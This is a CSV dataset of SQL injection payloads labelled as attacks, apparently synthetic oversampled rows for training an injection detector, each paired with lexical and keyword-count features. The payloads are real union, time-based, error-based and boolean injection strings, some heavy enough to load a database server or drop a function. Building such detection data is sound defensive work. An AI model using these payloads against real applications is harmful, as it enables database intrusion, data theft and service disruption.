id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000123,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000387,1.1643586578240464,105.89255423496763,26.757021693987053,4.0347489673127015,64.48595661202589,3.3785108469935246,27.271065081961158,10.757021693987053,0.609706325700673,0.03181787803302963,0.2570463049267616,0.10142949133953574,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.7570216939870527,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.37851084699352633,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000124,attack,time,1  )   and sleep  (  5  )   and   (  4855  =  4855,nearest_attack_euclidean,R003944,0.5402659550635677,62.535407105381864,15.946068460783536,2.8439458708540237,11.709551345587652,11.892136921567074,32.041581916660064,6.892136921567074,0.2001141920621713,0.1940296650533078,0.49965617967064824,0.1061999632138727,0.0,0.0,0.0,0.0,0.0,1.2365171151958843,0.0,5.419102691175304,0.0,0.0,0.23651711519588403,1.236517115195884,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,boolean,"1""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""ccuy""  =  ""ccuy",nearest_attack_euclidean,R006733,0.016863569415439258,150.17743784427722,28.035487568855444,3.9607694199531696,74.04731675847393,10.0,44.11829189618481,22.01182918961848,0.49308958033513434,0.06659497460837285,0.29373480885977876,0.14658063619671408,0.0,4.0,0.0,0.0,1.0,1.9881708103815188,0.0,6.023658379236962,0.0,5.0,4.0,2.988170810381519,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000126,attack,error,"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000797,0.07030198043815711,211.4372342208904,38.77674774584149,3.798106290217076,63.0,37.0,87.66048647504891,23.776747745841487,0.298018465839006,0.17502671803243208,0.4145077208060115,0.11244709532255041,0.0,1.0,1.0,0.0,1.0,1.0,0.0,15.776747745841487,0.0,0.0,3.0,3.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,1.0,1.0,6.0
SMOTE_000127,attack,boolean,hi' or 1  =  1 --,nearest_attack_euclidean,R000459,0.09762443255853077,16.70960700036892,8.854803500184463,2.683137155099229,3.8548035001844667,2.0,6.85480350018446,4.0,0.23016953530062806,0.11992465097749863,0.410056511766876,0.23984930195499726,1.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000128,attack,union," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000173,0.004808629440835709,71.03570579942969,30.017852899714846,4.320210856398511,44.0,2.0,16.017852899714846,9.01785289971485,0.6194151929047064,0.028155236041123022,0.22548644859905057,0.12694312245512,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000129,attack,other,-4057'  )   order by 1#,nearest_attack_euclidean,R001946,0.6976873356179916,28.206485262451594,16.952431973419344,3.6274203016330504,11.230269275741918,5.0,7.9762159867096685,4.0,0.37218594928082827,0.18836964736649056,0.2887486854594887,0.15069571789319244,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,2.0
SMOTE_000130,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001267,0.7435672888129778,55.14031671668254,24.30132551373296,3.7317914446208715,20.3766568921662,10.0,18.688328446083098,6.075331378433239,0.36412058878171394,0.18585121905906646,0.34003383059106346,0.10999436156815609,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.5376656892166194,0.0,0.0,0.0,1.5376656892166194,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.5376656892166198,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.53766568921662
SMOTE_000131,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R001357,0.24940872599926353,57.91094706027643,20.0,3.7224766966818024,14.0,20.0,15.528757648221141,8.382189412055284,0.24216824975296547,0.3459546425042364,0.2672298505434759,0.14464725719932217,0.0,0.0,3.0,0.0,0.0,0.0,0.0,2.3821894120552844,0.0,0.0,3.0,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,boolean,1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R002082,0.16047037167947964,356.21880994605397,29.80289383785446,3.2777220705065044,85.40868151356338,55.0,166.40868151356338,49.401446918927235,0.23969417039023722,0.1544485571285106,0.46715477270677097,0.13870249977448118,1.0,0.0,2.0,0.0,0.0,2.0,0.0,34.40144691892723,0.0,0.0,0.0,14.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000133,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R002505,0.20797839556256226,87.71785219491598,27.0,3.825235329924343,39.14523479661065,8.0,28.572617398305322,12.0,0.4458210723919026,0.0913843838378334,0.3257179680135139,0.13707657575675009,3.0,0.0,0.0,0.0,1.0,1.0,0.0,4.893154349576331,0.10684565042366888,1.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000134,attack,time,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R008555,0.27379953281645,59.235835131255456,18.0,2.8893093237934764,10.0,10.0,30.773572969647535,8.462262161607923,0.16939956028555708,0.16939956028555708,0.5183437365717429,0.14285714285714285,0.0,0.0,0.0,0.0,0.0,1.0,0.0,5.4622621616079226,0.0,0.0,1.0,0.9999999999999996,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001863,0.03955795829758258,62.41810819227545,16.0,3.1411376870804677,46.334486553820355,1.0,4.0,11.083621638455089,0.7422978308840134,0.016028380309996287,0.06411352123998515,0.1775602675660052,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,7.083621638455089,2.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,boolean,-9556 or   (  2049  =  6967  )  *6967# mhbc,nearest_attack_euclidean,R002502,0.3377447012831473,44.00704645909883,20.629404036936766,3.573447909240267,6.881165651711477,16.0,15.0,6.125880807387354,0.15405738452758794,0.36474567106904643,0.341949066627231,0.13924787777613462,0.0,0.0,1.0,0.0,0.8741191926126467,1.0,0.0,1.9999999999999991,0.0,0.12588080738735336,0.12588080738735363,2.8741191926126466,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000137,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R006842,0.1657565889874706,65.0,21.969820970796533,3.5869013515545105,13.0,20.0,24.0,8.0,0.2,0.3076923076923077,0.36923076923076925,0.12307692307692308,0.0,1.0,3.0,0.0,0.0,2.0,0.0,1.9999999999999991,0.0,0.0,0.0,5.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R004895,0.15201497901239577,74.5958160351019,16.0,3.1455505651994695,47.27665282808154,1.0,14.0,12.319163207020384,0.6334028913740326,0.013435250695642553,0.18809350973899538,0.16506834819132943,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.0,0.0,7.319163207020383,2.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,error,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",nearest_attack_euclidean,R002858,0.09047074311672933,429.3225477685495,35.88499584621308,3.5262054585240676,115.76999169242617,51.0,190.2650456916561,72.28751038446728,0.26972325726426555,0.1188094476646081,0.44309881482361596,0.1683684802475104,0.0,4.0,0.0,0.0,0.0,2.057502076893458,0.0,40.23000830757383,0.0,0.0,0.0,28.057502076893464,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000140,attack,boolean,1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#,nearest_attack_euclidean,R005636,0.08009528348835472,59.88641127172618,24.943205635863094,3.9745792629457326,18.0,17.0,17.0,7.886411271726187,0.30058752790486454,0.28388822079903875,0.28388822079903875,0.13163603049705797,2.886411271726187,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000141,attack,boolean,-1879%'   )    )    or 3038  =  3038,nearest_attack_euclidean,R006657,0.17343036566716707,37.2416357805395,13.7516728438921,2.8765547242563985,2.0,12.0,16.993308624431602,6.2483271561079,0.053873122248591476,0.32323873349154875,0.45521201760901464,0.1676761266508451,1.0,0.0,1.0,0.0,0.0,1.0,0.0,2.2483271561078997,0.9999999999999999,0.0,0.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000142,attack,boolean,"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R007066,0.03352097610604292,117.23126244924386,35.0,3.624822328175642,31.0,15.0,52.07280436996553,19.15845807927833,0.26563863107521,0.12853482148800482,0.4424614704120327,0.16336507702475245,2.0,1.0,2.0,1.0,0.0,1.0,0.0,10.15845807927833,0.9999999999999999,0.0,1.0,4.0,1.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000143,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R008874,0.483995626610742,123.80518059117178,34.41465575651227,4.3059494822080655,52.621983634768405,19.658623026049078,35.10991817384202,16.41465575651227,0.42741610623181675,0.15783748934482816,0.2817044674713177,0.13304193695203734,4.792672121743865,0.0,1.0,0.0,0.0,1.2073278782561347,0.0,4.4146557565122695,0.0,0.0,0.0,6.207327878256135,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,0.2073278782561347,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.207327878256135
SMOTE_000144,attack,other,1'   )    )    as nhkp where 8030  =  8030,nearest_attack_euclidean,R001806,2.0733508027703866e-06,42.0,17.0,3.1766362294386123,11.0,9.0,18.0,4.0,0.2619047619047619,0.21428571428571427,0.42857142857142855,0.09523809523809523,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000145,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'ggcm' like 'ggcm",nearest_attack_euclidean,R006852,0.07701923655673033,197.86868799417152,35.0,3.86686116392481,67.0,24.0,75.55723999514294,31.311447999028587,0.33893316104801735,0.12140889350973756,0.38142245193597685,0.15823549350626823,4.0,0.0,0.0,0.0,0.0,1.0,0.0,16.311447999028587,0.0,1.0,3.0,7.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000146,attack,boolean,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",nearest_attack_euclidean,R008546,0.1600648025645696,178.93972647464307,32.87945294928611,3.724219517947407,55.75890589857222,24.0,71.18082057607083,28.0,0.31160063628348555,0.13412361322605507,0.3977982017267285,0.1564775487637309,0.0,0.0,0.0,0.0,0.0,1.0,0.0,16.06027352535694,0.0,1.0,3.0,7.0,0.0,0.0,0.0,0.9397264746430571,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000147,attack,time,select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy,nearest_attack_euclidean,R002881,0.6840229115676992,50.5794424137776,21.022697832507884,3.6899239557484793,25.022697832507884,1.767023374380912,16.022697832507884,7.767023374380914,0.49743989542979006,0.03260225189470711,0.31718701148280665,0.1527708411926961,2.488651083746058,0.0,0.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.7443255418730289,0.2556744581269712,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.7443255418730289,0.0,0.0,0.0,0.7443255418730289,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.488651083746058
SMOTE_000148,attack,other,if  (  3490  =  4920  )   select 3490 else drop function hlzt--,nearest_attack_euclidean,R001051,0.0038073677936745812,63.0,25.0,4.029294816601902,28.0,12.0,18.0,5.0,0.4444444444444444,0.19047619047619047,0.2857142857142857,0.07936507936507936,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000149,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R002941,0.3730983451600324,71.09094053957847,24.405601662979645,3.8784597032139385,39.68533887659882,9.0,14.937067775319765,7.468533887659882,0.5564820726023032,0.12764921797707965,0.2105791396137448,0.1052895698068724,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.468533887659882,0.9999999999999996,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000150,attack,boolean," end and ""xlvn""  =  ""xlvn",nearest_attack_euclidean,R006821,1.1848669941706396,22.62128443343478,9.320366980981365,2.879506529103746,11.281467923925465,0.0,7.0,4.339816509509317,0.4829749245112215,0.0,0.31700224214657013,0.2000228333422085,0.0,3.0,0.0,0.0,0.0,1.0,0.0,0.0,0.3398165095093172,0.0,0.0,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000151,attack,error,"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000767,0.06713919375735614,275.12691700072384,37.96827074981904,4.058687636018137,102.0,43.0,97.12691700072384,33.0,0.3707403644956164,0.1562925066010932,0.353021716860591,0.11994541204269941,0.9682707498190396,0.0,2.0,0.0,2.0,2.0,0.0,18.03172925018096,0.0,2.0,5.0,6.0,0.9682707498190396,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,10.0
SMOTE_000152,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",nearest_attack_euclidean,R002002,0.04120692060825351,122.79806922502858,28.028847253567346,4.048936253989305,72.76922197146123,3.144236267836723,32.94230549286531,13.94230549286531,0.5925396165589183,0.025676118115281144,0.26826235570482826,0.1135219096209723,2.942305492865311,0.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
